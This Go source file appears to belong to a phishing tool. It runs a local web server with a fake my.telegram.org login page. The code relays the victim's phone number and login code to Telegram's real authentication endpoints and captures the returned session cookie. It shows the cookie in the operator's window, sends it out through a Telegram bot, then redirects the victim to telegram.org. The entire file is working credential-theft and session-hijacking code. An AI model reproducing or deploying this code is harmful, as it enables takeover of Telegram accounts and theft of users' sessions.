package main

import (
	"context"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"

	"github.com/raifpy/Go/errHandler"

	"fyne.io/fyne"
	"fyne.io/fyne/dialog"
	"fyne.io/fyne/widget"
)

func createRandomHash() string {
	const letterBytes = "abcdefghijklmnopqrstuvwxyz1234567890"
	const n = 18
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)

}
func serveMyTelegramLogin(kapat chan bool, win fyne.Window, textGrid *widget.TextGrid, textStream *string) {

	serveFunc := func(response http.ResponseWriter, request *http.Request) {
		if errHandler.HandlerBool(request.ParseForm()) {
			fmt.Fprintln(response, "ServerError")
			return
		}
		phone := request.FormValue("phone")
		hash := request.FormValue("random_hash")
		password := request.FormValue("password")

		if phone != "" && hash == "" {
			// sadece phone veriliyorsa
			rek, err := http.PostForm("https://my.telegram.org/auth/send_password", url.Values{
				"phone": {phone},
			})
			if errHandler.HandlerBool(err) {
				fmt.Fprintln(response, "PhoneError")
				return
			}
			ham, _ := ioutil.ReadAll(rek.Body)
			//log.Println(string(ham))
			fmt.Fprintln(response, string(ham))
			return

		} else if phone != "" && hash != "" {
			rek, err := http.PostForm("https://my.telegram.org/auth/login", url.Values{
				"phone":       {phone},
				"random_hash": {hash},
				"password":    {password},
				"remember":    {"1"},
			})
			if errHandler.HandlerBool(err) {
				fmt.Fprintln(response, "LoginError")
				return
			}
			cookies := rek.Cookies()
			if len(cookies) > 0 {
				cookie := cookies[0].Name + " : " + cookies[0].Value
				*textStream += "Phone = " + phone + "\nCookie = " + cookie + "\n"
				if useTelegramBot {
					tg.send("Phone = " + phone + "\nCookies:")
					tg.send(cookie)
				}
				textGrid.SetText(*textStream)
				notiApp.SendNotification(fyne.NewNotification("New Form", "phone : "+phone))
				//http.Redirect(response, request, "https://telegram.org", 301)
				fmt.Fprintln(response, "")
				return
			}
			*textStream += "Wrong Code :D : " + phone + "\n"
			textGrid.SetText(*textStream)
			if useTelegramBot {
				tg.send("Wrong Code for " + phone)
			}
			fmt.Fprintln(response, "Wrong Code : "+phone)
			return

		}
		*textStream += "New Request\n"
		textGrid.SetText(*textStream)
		fmt.Fprintln(response, myTelegramHtml)
	}
	serveRe := func(response http.ResponseWriter, request *http.Request) {
		http.Redirect(response, request, "https://telegram.org", 301)
		return
	}
	/*http.HandleFunc("/", serveFunc)
	http.HandleFunc("/re", serveRe)
	http.ListenAndServe(":8089", nil)*/

	m := http.NewServeMux()
	s := http.Server{Addr: ":8089", Handler: m}
	m.HandleFunc("/", serveFunc)
	m.HandleFunc("/re", serveRe)

	go func() {
		<-kapat
		s.Shutdown(context.Background())
		fmt.Println("Server Shutdown")

	}()

	if err := s.ListenAndServe(); errHandler.HandlerBool(err)  && err.Error() != serverClosedErrString{
		if useTelegramBot {
			tg.send(err.Error())
		}
		dialog.ShowError(err, win)
	}
}
